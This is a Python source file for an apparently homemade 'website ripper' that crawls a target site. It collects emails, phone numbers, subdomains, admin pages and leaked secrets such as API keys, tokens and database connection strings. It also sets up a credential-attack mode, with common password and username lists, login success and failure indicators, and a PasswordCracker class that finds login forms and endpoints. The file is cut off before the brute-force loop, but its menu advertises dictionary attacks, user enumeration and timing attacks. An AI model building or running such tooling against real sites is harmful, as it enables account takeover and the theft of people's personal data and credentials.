import os
import sys
import time
import json
import re
import requests
from urllib.parse import urljoin, urlparse, urldefrag
from colorama import init, Fore, Back, Style
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import deque
import hashlib
import mimetypes
from bs4 import BeautifulSoup
import socket
from urllib3.exceptions import InsecureRequestWarning
import string
import subprocess
import platform
import random
import webbrowser
from pathlib import Path

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

init(autoreset=True)

RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
PURPLE = Fore.MAGENTA
CYAN = Fore.CYAN
WHITE = Fore.WHITE
NC = Fore.RESET
BOLD = Style.BRIGHT

RESULTS_DIR = os.path.expanduser("~/scraper_results")
if not os.path.exists(RESULTS_DIR):
    os.makedirs(RESULTS_DIR)

SUBDIRS = {
    'html': os.path.join(RESULTS_DIR, 'html'),
    'images': os.path.join(RESULTS_DIR, 'images'),
    'css': os.path.join(RESULTS_DIR, 'css'),
    'js': os.path.join(RESULTS_DIR, 'js'),
    'json': os.path.join(RESULTS_DIR, 'json'),
    'backups': os.path.join(RESULTS_DIR, 'backups'),
    'videos': os.path.join(RESULTS_DIR, 'videos'),
    'documents': os.path.join(RESULTS_DIR, 'documents'),
    'fonts': os.path.join(RESULTS_DIR, 'fonts'),
    'extracted': os.path.join(RESULTS_DIR, 'extracted'),
    'logs': os.path.join(RESULTS_DIR, 'logs'),
    'reports': os.path.join(RESULTS_DIR, 'reports')
}

for subdir in SUBDIRS.values():
    if not os.path.exists(subdir):
        os.makedirs(subdir)

visited_urls = set()
all_links_found = set()
all_images = set()
all_videos = set()
all_documents = set()
found_emails = set()
found_phones = set()
found_secrets = []
found_admin_pages = []
found_social_media = []
found_subdomains = set()
all_js_files = set()
all_css_files = set()
all_forms = []
all_meta_tags = {}
total_requests = 0
valid_requests = 0
start_time = None
site_domain = ""
found_passwords = []
admin_panels_found = []
api_endpoints_found = []
login_forms_found = []
successful_logins = []

COMMON_PASSWORDS = [
    'admin', 'password', '123456', '12345678', '1234', 'qwerty', 
    'abc123', 'password1', 'admin123', 'letmein', 'welcome', 'monkey',
    'dragon', 'master', 'login', 'pass123', '12345', 'test', '123',
    '123456789', 'adminadmin', 'administrator', 'root', 'toor', 'user',
    'secret', 'pass', 'passw0rd', '000000', '111111', '123123',
    'iloveyou', 'princess', 'sunshine', 'password123', 'qwertyuiop',
    '1234567', '1234567890', 'baseball', 'football', 'superman',
    'michael', 'jordan', 'kobe', 'shadow', 'ashley', 'jesus', 'ninja',
    'mustang', 'charlie', 'jessica', 'jordan23', 'mickey', 'tigger',
    'purple', 'snoopy', 'pokemon', 'cookie', 'banana', 'computer',
    'internet', 'network', 'server', 'database', 'mysql', 'adminpass',
    'changeme', 'default', 'guest', 'user123', 'temp', 'temporary',
    '123qwe', 'qwerty123', '1q2w3e', '1qaz2wsx', 'zaq12wsx', 'asd123'
]

COMMON_USERNAMES = [
    'admin', 'administrator', 'root', 'user', 'test', 'guest',
    'manager', 'superuser', 'webmaster', 'admin1', 'admin2',
    'sysadmin', 'operator', 'support', 'info', 'office', 'dev',
    'developer', 'itadmin', 'network', 'server', 'sql', 'mysql',
    'postgres', 'oracle', 'dba', 'backup', 'deploy', 'jenkins',
    'tomcat', 'weblogic', 'jboss', 'glassfish', 'nginx', 'apache',
    'ftp', 'ftpuser', 'anonymous', 'nobody', 'nagios', 'zabbix'
]

ADMIN_PATHS = [
    'admin', 'administrator', 'login', 'signin', 'signup', 'register',
    'dashboard', 'panel', 'console', 'manage', 'management',
    'wp-admin', 'wp-login', 'backend', 'backoffice', 'cpanel',
    'controlpanel', 'adminpanel', 'adm', 'webadmin', 'siteadmin',
    'auth', 'authenticate', 'session', 'user', 'users',
    'account', 'accounts', 'profile', 'forgot', 'reset',
    'staff', 'moderator', 'supervisor', 'operator', 'control',
    'administration', 'sysadmin', 'root', 'secure', 'private',
    'hidden', 'secret', 'confidential', 'internal', 'employee'
]

SUCCESS_INDICATORS = [
    'dashboard', 'welcome', 'success', 'logged', 'session',
    'profile', 'account', 'settings', 'admin', 'panel',
    'redirect', 'home', 'index', 'status', 'successful',
    'authenticated', 'authorized', 'granted', 'access',
    'welcome', 'hello', 'user', 'management', 'control'
]

FAILURE_INDICATORS = [
    'invalid', 'failed', 'wrong', 'error', 'incorrect',
    'denied', 'forbidden', 'unauthorized', 'try again',
    'not found', 'does not exist', 'invalid credentials',
    'incorrect password', 'username not found', 'access denied',
    'login failed', 'authentication failed', 'invalid login'
]

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def animate_loading(text, duration=2):
    chars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        print(f'\r{BLUE}{chars[i % len(chars)]}{NC} {text}', end='')
        time.sleep(0.1)
        i += 1
    print(f'\r{GREEN}✓{NC} {text}')

def banner():
    clear()
    print(f"""{CYAN}
╔═══════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                           ║
║     ██████  ███████ ██    ██  ██████  ██ ███████                                        ║
║     ██   ██ ██      ██    ██ ██       ██ ██                                             ║
║     ██   ██ █████   ██    ██ ██   ███ ██ █████                                          ║
║     ██   ██ ██       ██  ██  ██    ██ ██ ██                                             ║
║     ██████  ███████   ████    ██████  ██ ██                                             ║
║                                                                                           ║
║          ███████  ██████ ██████  █████  ██████  ███████                                  ║
║          ██      ██      ██   ██ ██   ██ ██   ██ ██                                     ║
║          ███████ ██      ██████  ███████ ██████  █████                                   ║
║               ██ ██      ██   ██ ██   ██ ██      ██                                     ║
║          ███████  ██████ ██   ██ ██   ██ ██      ███████                                ║
║                                                                                           ║
║              🔥 DEV GIFT SCRAPER v11.0 🔥                                               ║
║              🕷️ ULTIMATE WEBSITE RIPPER                                               ║
║                                                                                           ║
║                                                                                           ║
║                                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════════════════════╝
{NC}""")
    print(f"""{YELLOW}┌───────────────────────────────────────────────────────────────────────────────────────────┐
│  DEVELOPER: Dev Gift                         CONTACT: 2349164624021         VERSION: 11.0          │
│  GITHUB: devvgift                            RESULTS: {GREEN}{RESULTS_DIR}{YELLOW}                         │
│  STATUS: {GREEN}● ONLINE AND READY{NC}{YELLOW}                                                     │
└───────────────────────────────────────────────────────────────────────────────────────────┘
{NC}""")

def save_results(filename, content):
    try:
        filepath = os.path.join(RESULTS_DIR, filename)
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content)
        return filepath
    except Exception as e:
        print(f"{RED}✗ ERROR saving: {e}{NC}")
        return None

def view_file(filepath):
    try:
        if filepath.startswith('http'):
            response = requests.get(filepath, verify=False, timeout=10)
            content = response.text
        else:
            if not os.path.exists(filepath):
                test_path = os.path.join(RESULTS_DIR, filepath)
                if os.path.exists(test_path):
                    filepath = test_path
                else:
                    print(f"{RED}✗ File not found: {filepath}{NC}")
                    return
            
            with open(filepath, 'r', encoding='utf-8') as f:
                content = f.read()
        
        clear()
        print(f"""{CYAN}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              📄 FILE VIEWER                                                  ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{NC}""")
        print(f"{GREEN}📄 FILE: {WHITE}{filepath}{NC}")
        print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
        
        lines = content.split('\n')
        total_lines = len(lines)
        page_size = 30
        current_page = 0
        total_pages = (total_lines + page_size - 1) // page_size
        
        while True:
            clear()
            print(f"""{CYAN}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              📄 FILE VIEWER                                                  ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{NC}""")
            print(f"{GREEN}📄 FILE: {WHITE}{filepath}{NC}")
            print(f"{BLUE}📊 Page {current_page+1}/{total_pages} ({total_lines} lines){NC}")
            print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
            
            start_line = current_page * page_size
            end_line = min(start_line + page_size, total_lines)
            
            for i in range(start_line, end_line):
                if any(keyword in lines[i].lower() for keyword in ['password', 'secret', 'key', 'token']):
                    print(f"{RED}{i+1:4d}{NC} {RED}{lines[i]}{NC}")
                elif 'http' in lines[i] or 'https' in lines[i]:
                    print(f"{BLUE}{i+1:4d}{NC} {BLUE}{lines[i]}{NC}")
                elif any(keyword in lines[i].lower() for keyword in ['admin', 'login', 'dashboard']):
                    print(f"{GREEN}{i+1:4d}{NC} {GREEN}{lines[i]}{NC}")
                else:
                    print(f"{BLUE}{i+1:4d}{NC} {lines[i]}")
            
            print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
            print(f"\n{YELLOW}CONTROLS:{NC}")
            print(f"  {GREEN}[N]{NC} Next Page   {GREEN}[P]{NC} Previous Page   {GREEN}[G]{NC} Go to Line")
            print(f"  {GREEN}[S]{NC} Search      {GREEN}[E]{NC} Export File   {GREEN}[B]{NC} Back")
            
            choice = input(f"\n{YELLOW}┌─[{GREEN}SELECT OPTION{YELLOW}]{NC}\n└──➜ ").lower()
            
            if choice == 'n':
                if current_page < total_pages - 1:
                    current_page += 1
            elif choice == 'p':
                if current_page > 0:
                    current_page -= 1
            elif choice == 'g':
                try:
                    line_num = int(input(f"{YELLOW}Enter line number: {NC}")) - 1
                    if 0 <= line_num < total_lines:
                        current_page = line_num // page_size
                except:
                    pass
            elif choice == 's':
                search_term = input(f"{YELLOW}Enter search term: {NC}")
                matches = []
                for i, line in enumerate(lines):
                    if search_term.lower() in line.lower():
                        matches.append(i)
                if matches:
                    print(f"{GREEN}✓ Found {len(matches)} matches{NC}")
                    for match in matches[:10]:
                        print(f"  {GREEN}▶{NC} Line {match+1}: {lines[match][:100]}...")
                    if len(matches) > 10:
                        print(f"  {YELLOW}... and {len(matches)-10} more matches{NC}")
                    current_page = matches[0] // page_size
                    input(f"{YELLOW}Press Enter to continue...{NC}")
                else:
                    print(f"{RED}✗ No matches found{NC}")
                    time.sleep(1)
            elif choice == 'e':
                try:
                    export_path = os.path.join(SUBDIRS['reports'], f"export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
                    with open(export_path, 'w', encoding='utf-8') as f:
                        f.write(content)
                    print(f"{GREEN}✓ Exported to: {export_path}{NC}")
                    time.sleep(1)
                except:
                    print(f"{RED}✗ Export failed{NC}")
                    time.sleep(1)
            elif choice == 'b':
                break
        
    except Exception as e:
        print(f"{RED}✗ ERROR: {e}{NC}")
        input(f"\n{YELLOW}Press Enter to continue...{NC}")

def interactive_file_browser():
    while True:
        clear()
        print(f"""{CYAN}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              📂 FILE BROWSER                                                 ║
║              {RESULTS_DIR}                                                    ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{NC}""")
        
        if not os.path.exists(RESULTS_DIR):
            print(f"\n{RED}✗ No results directory found{NC}")
            input(f"\n{YELLOW}Press Enter to continue...{NC}")
            return
        
        all_files = []
        for root, dirs, filenames in os.walk(RESULTS_DIR):
            for filename in filenames:
                if filename.endswith('.txt'):
                    rel_path = os.path.relpath(os.path.join(root, filename), RESULTS_DIR)
                    all_files.append(rel_path)
        
        if not all_files:
            print(f"\n{YELLOW}⚠ No saved results found{NC}")
            input(f"\n{YELLOW}Press Enter to continue...{NC}")
            return
        
        files = sorted(all_files, key=lambda x: os.path.getmtime(os.path.join(RESULTS_DIR, x)), reverse=True)
        
        print(f"\n{GREEN}✓ Found {len(files)} result files:{NC}\n")
        
        for i, file in enumerate(files[:30], 1):
            filepath = os.path.join(RESULTS_DIR, file)
            size = os.path.getsize(filepath)
            mtime = datetime.fromtimestamp(os.path.getmtime(filepath)).strftime('%Y-%m-%d %H:%M')
            file_type = "📄"
            if "password" in file.lower() or "crack" in file.lower():
                file_type = "🔐"
            elif "scrape" in file.lower():
                file_type = "🕷️"
            elif "secret" in file.lower():
                file_type = "🔑"
            elif "admin" in file.lower():
                file_type = "👑"
            print(f"  {GREEN}[{i:2d}]{NC} {file_type} {file} {BLUE}({size} bytes, {mtime}){NC}")
        
        if len(files) > 30:
            print(f"\n{YELLOW}... and {len(files) - 30} more files{NC}")
        
        print(f"\n{YELLOW}OPTIONS:{NC}")
        print(f"  {GREEN}[number]{NC} View file")
        print(f"  {GREEN}[d]{NC} Delete a file")
        print(f"  {GREEN}[c]{NC} Clear all results")
        print(f"  {GREEN}[e]{NC} Export all results")
        print(f"  {GREEN}[s]{NC} Search in files")
        print(f"  {GREEN}[b]{NC} Back to menu")
        
        choice = input(f"\n{YELLOW}┌─[{GREEN}SELECT OPTION{YELLOW}]{NC}\n└──➜ ")
        
        if choice.lower() == 'b':
            return
        elif choice.lower() == 'c':
            confirm = input(f"{RED}Delete ALL results? (y/n): {NC}")
            if confirm.lower() == 'y':
                for file in all_files:
                    os.remove(os.path.join(RESULTS_DIR, file))
                print(f"{GREEN}✓ All results cleared{NC}")
                animate_loading("Cleaning up...", 1)
                input(f"\n{YELLOW}Press Enter to continue...{NC}")
            return
        elif choice.lower() == 'e':
            try:
                export_file = os.path.join(SUBDIRS['reports'], f"all_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
                with open(export_file, 'w', encoding='utf-8') as out:
                    for file in all_files:
                        out.write(f"═══ {file} ═══\n")
                        with open(os.path.join(RESULTS_DIR, file), 'r', encoding='utf-8') as f:
                            out.write(f.read())
                        out.write("\n\n")
                print(f"{GREEN}✓ Exported all results to: {export_file}{NC}")
                time.sleep(1)
            except:
                print(f"{RED}✗ Export failed{NC}")
                time.sleep(1)
            continue
        elif choice.lower() == 's':
            search_term = input(f"{YELLOW}Enter search term: {NC}")
            matches = []
            for file in all_files:
                try:
                    with open(os.path.join(RESULTS_DIR, file), 'r', encoding='utf-8') as f:
                        content = f.read()
                        if search_term.lower() in content.lower():
                            matches.append(file)
                except:
                    pass
            if matches:
                print(f"{GREEN}✓ Found {len(matches)} files containing '{search_term}'{NC}")
                for match in matches[:20]:
                    print(f"  {GREEN}▶{NC} {match}")
                input(f"\n{YELLOW}Press Enter to continue...{NC}")
            else:
                print(f"{RED}✗ No matches found{NC}")
                time.sleep(1)
            continue
        elif choice.lower() == 'd':
            file_num = input(f"{YELLOW}Enter file number to delete: {NC}")
            try:
                idx = int(file_num) - 1
                if 0 <= idx < len(files):
                    confirm = input(f"{RED}Delete {files[idx]}? (y/n): {NC}")
                    if confirm.lower() == 'y':
                        os.remove(os.path.join(RESULTS_DIR, files[idx]))
                        print(f"{GREEN}✓ Deleted: {files[idx]}{NC}")
                        time.sleep(1)
                else:
                    print(f"{RED}✗ Invalid number{NC}")
                    time.sleep(1)
            except:
                print(f"{RED}✗ Invalid input{NC}")
                time.sleep(1)
            continue
        else:
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(files):
                    filepath = os.path.join(RESULTS_DIR, files[idx])
                    view_file(filepath)
                else:
                    print(f"{RED}✗ Invalid number{NC}")
                    time.sleep(1)
            except:
                print(f"{RED}✗ Invalid input{NC}")
                time.sleep(1)

def about():
    clear()
    print(f"""{CYAN}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              🔥 DEV GIFT SCRAPER v11.0                                        ║
║              🕷️ ULTIMATE WEBSITE RIPPER                                       ║
║                                                                               ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{NC}""")
    print(f"""
{YELLOW}┌───────────────────────────────────────────────────────────────────────────────────────────┐
│  {GREEN}📌 FEATURES{NC}                                                                              │
├───────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                           │
│  {GREEN}🔍 SCRAPE MODE:{NC}                                                                      │
│  • ALL HTML pages & links (Complete website crawling)                                   │
│  • ALL images, videos, documents (Media file extraction)                               │
│  • CSS & JavaScript files (Frontend resource gathering)                                │
│  • Hidden admin panels (Admin panel discovery)                                         │
│  • Config files & secrets (.env, config.php, settings.py)                              │
│  • API keys & database backups (Sensitive data extraction)                             │
│  • Email addresses & phone numbers (Contact info scraping)                             │
│  • Social media & subdomains (OSINT gathering)                                         │
│  • Sitemap parsing & crawling (SEO and structure analysis)                             │
│                                                                                           │
│  {RED}🔐 PASSWORD CRACK MODE:{NC}                                                             │
│  • Target specific admin panel (Precise targeting)                                     │
│  • Find login API endpoints (API discovery)                                            │
│  • Extract password via timing attack (Timing analysis)                                │
│  • Brute force with common passwords (Dictionary attack)                               │
│  • Show successful logins (Credential reporting)                                       │
│  • Multiple username testing (Automated user enumeration)                              │
│                                                                                           │
│  {BLUE}📂 FILE MANAGEMENT:{NC}                                                               │
│  • Interactive file browser (Visual file explorer)                                     │
│  • Paginated file viewer (Easy navigation)                                             │
│  • Search in files (Content search)                                                    │
│  • Export results (Data export)                                                         │
│  • Delete individual files (File management)                                           │
│  • Clear all results (Bulk cleanup)                                                    │
│                                                                                           │
│  {PURPLE}🎨 UI FEATURES:{NC}                                                                │
│  • Color-coded output (Visual hierarchy)                                               │
│  • Loading animations (Visual feedback)                                                │
│  • Progress bars (Status tracking)                                                     │
│  • ASCII art banners (Professional look)                                               │
│  • Interactive menus (User-friendly)                                                   │
│  • Real-time updates (Live status)                                                     │
│                                                                                           │
├───────────────────────────────────────────────────────────────────────────────────────────┤
│  {GREEN}📁 RESULTS DIRECTORY:{NC} {RESULTS_DIR}                                             │
│  {GREEN}👤 DEVELOPER:{NC} Dev Gift                                                          │
│  {GREEN}📧 CONTACT:{NC} 2349164624021                                                      │
│  {GREEN}🐙 GITHUB:{NC} github.com/devvgift                                                 │
│  {GREEN}🔧 VERSION:{NC} 11.0                                                               │
└───────────────────────────────────────────────────────────────────────────────────────────┘
{NC}""")
    input(f"\n{YELLOW}Press Enter to continue...{NC}")

def progress_bar(current, total, text=""):
    width = 50
    if total > 0:
        percent = int((current * 100) / total)
        filled = int((percent * width) / 100)
        empty = width - filled
        elapsed = time.time() - start_time if start_time else 0
        print(f"\r{BLUE}[{NC}{'█' * filled}{'░' * empty}{BLUE}]{NC} {WHITE}{percent:3d}%{NC} {YELLOW}{text}{NC}", end='')

def extract_emails(text):
    email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    return set(re.findall(email_pattern, text))

def extract_phones(text):
    phone_patterns = [
        r'\+?\d{1,3}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,9}',
        r'\d{3}[-.\s]?\d{3}[-.\s]?\d{4}',
        r'\(\d{3}\)\s?\d{3}-\d{4}',
        r'\d{3}\.\d{3}\.\d{4}',
        r'\d{4}[-.\s]?\d{4}'
    ]
    phones = set()
    for pattern in phone_patterns:
        phones.update(re.findall(pattern, text))
    return phones

def extract_secrets(content):
    secrets = []
    patterns = {
        'API Key': r'api[_-]?key[\s]*[:=][\s]*["\']?([a-zA-Z0-9_\-]{16,})["\']?',
        'Secret Key': r'secret[\s]*[:=][\s]*["\']?([a-zA-Z0-9_\-]{16,})["\']?',
        'Password': r'password[\s]*[:=][\s]*["\']?([^"\'\s]{6,})["\']?',
        'Token': r'token[\s]*[:=][\s]*["\']?([a-zA-Z0-9_\-]{20,})["\']?',
        'AWS Key': r'AKIA[0-9A-Z]{16}',
        'Private Key': r'-----BEGIN (RSA|DSA|EC) PRIVATE KEY-----',
        'JWT Token': r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
        'MongoDB': r'mongodb://[^"\'\s]+',
        'MySQL': r'mysql://[^"\'\s]+',
        'PostgreSQL': r'postgresql://[^"\'\s]+',
        'Redis': r'redis://[^"\'\s]+',
        'RabbitMQ': r'amqp://[^"\'\s]+',
        'Elasticsearch': r'elasticsearch://[^"\'\s]+'
    }
    
    for key, pattern in patterns.items():
        matches = re.findall(pattern, content, re.IGNORECASE)
        for match in matches:
            if match and len(str(match)) > 3:
                secrets.append({'type': key, 'value': match[:50]})
    return secrets

def find_admin_pages(text, url):
    admin_keywords = [
        'admin', 'login', 'dashboard', 'panel', 'console', 'manage', 
        'wp-admin', 'administrator', 'backend', 'cp', 'cpanel',
        'controlpanel', 'adminpanel', 'adm', 'webadmin', 'siteadmin',
        'user', 'auth', 'signin', 'signup', 'register', 'forgot', 'reset',
        'administer', 'management', 'staff', 'moderator', 'supervisor',
        'operator', 'control', 'administration', 'sysadmin', 'root',
        'secure', 'private', 'hidden', 'secret', 'confidential'
    ]
    
    found = []
    url_lower = url.lower()
    for keyword in admin_keywords:
        if keyword in url_lower:
            found.append({'url': url, 'type': keyword})
            
    for keyword in admin_keywords:
        if keyword in text.lower():
            found.append({'url': url, 'type': f'admin_text_{keyword}'})
    
    return found

def find_social_media(text):
    social_patterns = {
        'Facebook': r'(?:https?://)?(?:www\.)?facebook\.com/[a-zA-Z0-9.]+',
        'Twitter': r'(?:https?://)?(?:www\.)?twitter\.com/[a-zA-Z0-9_]+',
        'Instagram': r'(?:https?://)?(?:www\.)?instagram\.com/[a-zA-Z0-9_.]+',
        'LinkedIn': r'(?:https?://)?(?:www\.)?linkedin\.com/(?:in|company)/[a-zA-Z0-9_-]+',
        'YouTube': r'(?:https?://)?(?:www\.)?youtube\.com/(?:c|channel|user)/[a-zA-Z0-9_-]+',
        'GitHub': r'(?:https?://)?(?:www\.)?github\.com/[a-zA-Z0-9_-]+',
        'Pinterest': r'(?:https?://)?(?:www\.)?pinterest\.com/[a-zA-Z0-9_.]+',
        'TikTok': r'(?:https?://)?(?:www\.)?tiktok\.com/@[a-zA-Z0-9_.]+',
        'Reddit': r'(?:https?://)?(?:www\.)?reddit\.com/(?:r|user)/[a-zA-Z0-9_]+',
        'WhatsApp': r'(?:https?://)?(?:www\.)?wa\.me/[0-9]+',
        'Telegram': r'(?:https?://)?(?:www\.)?t\.me/[a-zA-Z0-9_]+',
        'Discord': r'discord\.gg/[a-zA-Z0-9_]+',
        'Snapchat': r'(?:https?://)?(?:www\.)?snapchat\.com/add/[a-zA-Z0-9_]+'
    }
    
    found = {}
    for platform, pattern in social_patterns.items():
        matches = re.findall(pattern, text, re.IGNORECASE)
        if matches:
            found[platform] = matches
    return found

def find_subdomains(base_url):
    domain = urlparse(base_url).netloc
    if domain.startswith('www.'):
        domain = domain[4:]
    
    subdomains = set()
    common_subdomains = [
        'www', 'mail', 'ftp', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
        'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test',
        'ns', 'blog', 'support', 'dev', 'stage', 'api', 'app', 'admin', 'dashboard',
        'cdn', 'static', 'media', 'assets', 'upload', 'download', 'files', 'docs',
        'backup', 'secure', 'portal', 'shop', 'store', 'market', 'news', 'forum',
        'mail2', 'web', 'server', 'sql', 'db', 'database', 'mysql', 'postgres',
        'redis', 'elastic', 'kibana', 'grafana', 'jenkins', 'git', 'svn',
        'jira', 'confluence', 'wiki', 'help', 'status', 'stats', 'analytics'
    ]
    
    for sub in common_subdomains:
        try:
            test_domain = f"{sub}.{domain}"
            socket.gethostbyname(test_domain)
            subdomains.add(f"{sub}.{domain}")
        except:
            pass
    
    return subdomains

def parse_sitemap(base_url):
    urls = []
    sitemap_urls = [
        '/sitemap.xml',
        '/sitemap_index.xml',
        '/sitemap.txt',
        '/sitemap.html',
        '/sitemap.xml.gz',
        '/sitemap.php',
        '/sitemap/'
    ]
    
    for sitemap_path in sitemap_urls:
        try:
            sitemap_url = urljoin(base_url, sitemap_path)
            response = requests.get(sitemap_url, timeout=10, verify=False)
            if response.status_code == 200:
                if sitemap_path.endswith('.xml'):
                    import xml.etree.ElementTree as ET
                    try:
                        root = ET.fromstring(response.content)
                        for loc in root.findall('.//{http://www.sitemaps.org/schemas/sitemap/0.9}loc'):
                            urls.append(loc.text)
                    except:
                        pass
                elif sitemap_path.endswith('.txt'):
                    urls.extend([line.strip() for line in response.text.split('\n') if line.strip()])
                break
        except:
            continue
    
    return urls

def find_login_api(content, base_url):
    api_patterns = [
        r'url\s*[:=]\s*["\']([^"\']*api[^"\']*)["\']',
        r'endpoint\s*[:=]\s*["\']([^"\']*)["\']',
        r'api_url\s*[:=]\s*["\']([^"\']*)["\']',
        r'ajaxurl\s*[:=]\s*["\']([^"\']*)["\']',
        r'action\s*[:=]\s*["\']([^"\']*(?:login|auth|authenticate|verify|check|validate)[^"\']*)["\']',
        r'/api/[^"\']*login[^"\']*',
        r'/v[0-9]+/[^"\']*login[^"\']*',
        r'/auth/[^"\']*login[^"\']*',
        r'/login/[^"\']*',
        r'/authenticate',
        r'/verify',
        r'/check',
        r'/signin',
        r'/sign_in',
        r'/log_in',
        r'/log-in',
        r'/session',
        r'/sessions'
    ]
    
    endpoints = []
    
    for pattern in api_patterns:
        matches = re.findall(pattern, content, re.IGNORECASE)
        for match in matches:
            if match:
                if match.startswith('/'):
                    full_url = urljoin(base_url, match)
                    endpoints.append(full_url)
                elif match.startswith('http'):
                    endpoints.append(match)
                else:
                    endpoints.append(match)
    
    return list(set(endpoints))

def scrape_page(url, session):
    global total_requests, valid_requests, visited_urls, found_emails, found_phones
    global found_secrets, found_admin_pages, found_social_media, found_subdomains
    global all_js_files, all_css_files, all_forms, all_meta_tags
    global all_images, all_videos, all_documents, all_links_found
    global api_endpoints_found, login_forms_found
    
    if url in visited_urls:
        return None
    
    visited_urls.add(url)
    total_requests += 1
    
    try:
        response = session.get(url, timeout=15, verify=False, allow_redirects=True)
        valid_requests += 1
        
        content = response.text
        soup = BeautifulSoup(content, 'html.parser')
        
        for a_tag in soup.find_all('a', href=True):
            link = urljoin(url, a_tag['href'])
            link = urldefrag(link)[0]
            all_links_found.add(link)
        
        for img in soup.find_all('img', src=True):
            img_url = urljoin(url, img['src'])
            all_images.add(img_url)
        
        for video in soup.find_all('video'):
            for src in video.find_all('source', src=True):
                video_url = urljoin(url, src['src'])
                all_videos.add(video_url)
            if video.get('src'):
                video_url = urljoin(url, video['src'])
                all_videos.add(video_url)
        
        for css in soup.find_all('link', rel='stylesheet', href=True):
            css_url = urljoin(url, css['href'])
            all_css_files.add(css_url)
        
        for script in soup.find_all('script', src=True):
            js_url = urljoin(url, script['src'])
            all_js_files.add(js_url)
        
        for form in soup.find_all('form'):
            form_data = {
                'action': urljoin(url, form.get('action', '')),
                'method': form.get('method', 'GET'),
                'inputs': []
            }
            for input_tag in form.find_all('input'):
                input_data = {
                    'type': input_tag.get('type', 'text'),
                    'name': input_tag.get('name', ''),
                    'value': input_tag.get('value', '')
                }
                form_data['inputs'].append(input_data)
            all_forms.append(form_data)
        
        for meta in soup.find_all('meta'):
            if meta.get('name'):
                all_meta_tags[meta['name']] = meta.get('content', '')
        
        emails = extract_emails(content)
        found_emails.update(emails)
        
        phones = extract_phones(content)
        found_phones.update(phones)
        
        secrets = extract_secrets(content)
        found_secrets.extend(secrets)
        
        admin_pages = find_admin_pages(content, url)
        found_admin_pages.extend(admin_pages)
        
        social_media = find_social_media(content)
        for platform, urls in social_media.items():
            if platform not in found_social_media:
                found_social_media.append({platform: urls})
        
        api_endpoints = find_login_api(content, base_url)
        api_endpoints_found.extend(api_endpoints)
        
        filename = f"{hashlib.md5(url.encode()).hexdigest()}.html"
        filepath = os.path.join(SUBDIRS['html'], filename)
        with open(filepath, 'w', encoding='utf-8', errors='ignore') as f:
            f.write(content)
        
        return {
            'url': url,
            'links': all_links_found,
            'emails': emails,
            'phones': phones,
            'secrets': secrets,
            'admin_pages': admin_pages,
            'social_media': social_media,
            'title': soup.title.string if soup.title else '',
            'status': response.status_code
        }
        
    except Exception as e:
        return None

class PasswordCracker:
    def __init__(self, target_url, session=None):
        self.target_url = target_url
        self.session = session or requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        })
        self.api_endpoints = []
        self.login_forms = []
        self.found_credentials = []
        self.characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"
        
    def discover(self):
        print(f"\n{CYAN}🔍 DISCOVERING LOGIN MECHANISMS...{NC}")
        animate_loading("Analyzing page structure...", 1.5)
        
        try:
            response = self.session.get(self.target_url, timeout=15, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for script in soup.find_all('script'):
                if script.string:
                    endpoints = find_login_api(script.string, self.target_url)
                    self.api_endpoints.extend(endpoints)
            
            for form in soup.find_all('form'):
                action = form.get('action', '')
                method = form.get('method', 'POST').upper()
                
                has_password = False
                for input_tag in form.find_all('input'):
                    if input_tag.get('type') == 'password':
                        has_password = True
                        break
                
                if has_password:
                    form_url = urljoin(self.target_url, action)
                    self.login_forms.append({
                        'url': form_url,
                        'method': method,
                        'inputs': [i.get('name', '') for i in form.find_all('input') if i.get('name')]
                    })
            
            self.api_endpoints = list(set(self.api_endpoints))
            self.api_endpoints = [api for api in self.api_endpoints if any(x in api.lower() for x in ['login', 'auth', 'verify', 'signin', 'authenticate'])]
            
            print(f"{GREEN}✅ Found {len(self.api_endpoints)} API endpoints{NC}")
            for api in self.api_endpoints[:5]:
                print(f"  {GREEN}▶{NC} {api}")
            
